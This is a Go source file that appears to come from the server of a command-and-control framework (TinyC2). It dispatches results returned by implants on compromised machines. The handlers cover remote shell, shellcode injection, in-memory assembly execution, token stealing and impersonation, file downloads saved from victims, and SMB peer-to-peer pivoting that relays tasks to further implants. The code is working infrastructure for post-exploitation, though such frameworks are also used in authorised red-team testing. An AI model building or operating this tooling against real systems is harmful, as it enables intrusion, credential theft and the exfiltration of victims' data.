package core

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/0xPrimo/TinyC2/server/internal/pkg/logger"
	"github.com/pterm/pterm"
)

type TaskResultHandler func(*Engine, uint32, TaskResult) error

var TaskResultHandlers map[string]TaskResultHandler

func SetupImplantTaskResultHandlers() {
	TaskResultHandlers = map[string]TaskResultHandler{
		"channel.switch":   handleOutput,
		"channel.regsiter": handleOutput,
		"cd":               handleOutput,
		"cp":               handleOutput,
		"shell":            handleOutput,
		"upload":           handleOutput,
		"run":              handleOutput,
		"execute-assembly": handleOutput,
		"inline-execute":   handleOutput,
		"inject-shellcode": handleOutput,
		"ps":               handlePs,
		"download":         handleDownload,
		"job.list":         handleJobList,
		"token.info":       handleTokenInfo,
		"token.rev2self":   handleOutput,
		"token.make":       handleOutput,
		"token.steal":      handleOutput,
		"pivot.connect":    handlePivotConnect,
		"pivot.proxy":      handlePivotProxy,
		"pivot.request":    handlePivotRequest,
	}
}

func (e *Engine) ImplantTaskResultDispatch(id uint32, tasks []TaskResult) {
	// process tasks
	for _, task := range tasks {
		if handler, ok := TaskResultHandlers[task.Name]; ok {
			if err := handler(e, id, task); err != nil {
				logger.Error("failed to process task result %s result: %v", task.Name, err)
			}
		}
	}
}

func handlePivotRequest(engine *Engine, id uint32, task TaskResult) error {
	return nil
}

func handlePivotConnect(engine *Engine, id uint32, task TaskResult) error {
	var checkin ImplantResponse
	var request []byte

	err := json.Unmarshal([]byte(task.Artifact), &checkin)
	if err != nil {
		logger.Error("error parsing JSON: %v", err)
		return err
	}

	if !engine.ImplantExists(checkin.ID) {
		request, err = engine.ImplantRegister(checkin.ID, "p2p/smb")
		if err != nil {
			logger.Error("failed to register peer-2-peer smb implant")
			return err
		}

	} else {
		logger.Error("peer implant already registred")
	}

	// send back peer implant queued tasks
	engine.ImplantTaskExecute(id, map[string]any{
		"name":     "pivot.request",
		"args":     []uint32{checkin.ID},
		"artifact": base64.StdEncoding.EncodeToString(request),
	})

	return nil
}

func handlePivotProxy(engine *Engine, id uint32, task TaskResult) error {
	var responses []ImplantResponse
	var request []byte

	err := json.Unmarshal([]byte(task.Artifact), &responses)
	if err != nil {
		logger.Error("error parsing JSON: %v", err)
		return err
	}

	for _, response := range responses {
		if engine.ImplantExists(response.ID) {

			// update implant last seen
			implant := engine.Implants[response.ID]
			implant.Seen = time.Now()
			engine.Implants[response.ID] = implant

			// task result processing
			engine.ImplantTaskResultDispatch(response.ID, response.Tasks)

			request = engine.ImplantGetTaskRequests(response.ID)
		} else {
			logger.Error("peer implant not registred")
			return fmt.Errorf("peer implant is not registred")
		}

		if request != nil {
			engine.ImplantTaskExecute(id, map[string]any{
				"name":     "pivot.request",
				"args":     []uint32{response.ID},
				"artifact": base64.StdEncoding.EncodeToString(request),
			})
		}
	}

	return nil
}

type FileInfo struct {
	Name string `json:"name"`
	Size uint32 `json:"size"`
	Data string `json:"data"`
}

func handleDownload(engine *Engine, id uint32, task TaskResult) error {
	var file FileInfo

	err := json.Unmarshal([]byte(task.Artifact), &file)
	if err != nil {
		logger.Error("error occurred during unmarshaling: %v", err)
		return fmt.Errorf("error occurred during unmarshaling: %v", err)
	}

	data, err := base64.StdEncoding.DecodeString(file.Data)
	if err != nil {
		logger.Error("failed to decode base64: %v", err)
		return fmt.Errorf("failed to decode base64: %v", err)
	}

	err = os.MkdirAll("uploads", 0o755)
	if err != nil {
		logger.Error("failed to create directory: %v", err)
		return fmt.Errorf("failed to create directory: %v", err)
	}

	var filename string
	slshindex := strings.LastIndex(file.Name, `\`)
	if slshindex == -1 {
		filename = file.Name
	} else {
		filename = file.Name[slshindex+1:]
	}

	dest := filepath.Join(
		"uploads",
		filename,
	)

	err = os.WriteFile(dest, data, 0o644)
	if err != nil {
		logger.Error("failed to write to file: %v", err)
		return fmt.Errorf("failed to write to file: %v", err)
	}

	return nil
}

type ProcessInfo struct {
	Name    string `json:"name"`
	Account string `json:"account"`
	Pid     uint32 `json:"pid"`
	PPid    uint32 `json:"ppid"`
}

func handlePs(engine *Engine, id uint32, task TaskResult) error {
	var pslist []ProcessInfo
	err := json.Unmarshal([]byte(task.Artifact), &pslist)
	if err != nil {
		logger.Error("error occurred during unmarshaling: %v", err)
		return fmt.Errorf("error occurred during unmarshaling: %v", err)
	}

	table := pterm.TableData{
		{"PPID", "PID", "Account", "Name"},
	}

	for _, ps := range pslist {
		table = append(table, []string{
			pterm.Cyan(fmt.Sprintf("%d", ps.PPid)),
			pterm.Cyan(fmt.Sprintf("%d", ps.Pid)),
			pterm.Cyan(ps.Account),
			pterm.Cyan(ps.Name),
		})
	}

	pterm.Println()
	pterm.DefaultTable.
		WithHasHeader().
		WithBoxed().
		WithHeaderStyle(pterm.NewStyle(pterm.FgLightMagenta, pterm.Bold)).
		WithData(table).
		Render()
	pterm.Println()

	return nil
}

type JobInfo struct {
	ID uint32 `json:"id"`
}

func handleJobList(engine *Engine, id uint32, task TaskResult) error {
	var joblist []JobInfo
	err := json.Unmarshal([]byte(task.Artifact), &joblist)
	if err != nil {
		logger.Error("error occurred during unmarshaling: %v", err)
		return fmt.Errorf("error occurred during unmarshaling: %v", err)
	}

	table := pterm.TableData{
		{"ID"},
	}

	for _, job := range joblist {
		table = append(table, []string{
			pterm.Cyan(fmt.Sprintf("%X", job.ID)),
		})
	}

	pterm.Println()
	pterm.DefaultTable.
		WithHasHeader().
		WithBoxed().
		WithHeaderStyle(pterm.NewStyle(pterm.FgLightMagenta, pterm.Bold)).
		WithData(table).
		Render()
	pterm.Println()

	return nil
}

func handleOutput(engine *Engine, id uint32, task TaskResult) error {
	logger.Success("received output:\n%s\n", task.Output)
	return nil
}

type TokenInfo struct {
	AccessToken        string `json:"access_token"`
	ImpersonationToken string `json:"impersonation_token"`
}

func handleTokenInfo(engine *Engine, id uint32, task TaskResult) error {
	var token TokenInfo
	err := json.Unmarshal([]byte(task.Artifact), &token)
	if err != nil {
		logger.Error("error occurred during unmarshaling: %v", err)
		return fmt.Errorf("error occurred during unmarshaling: %v", err)
	}

	logger.Success("Process Token Information:")
	logger.Info("\t - Access Token: %s", token.AccessToken)
	logger.Info("\t - ImpersonationToken: %s", token.ImpersonationToken)
	return nil
}
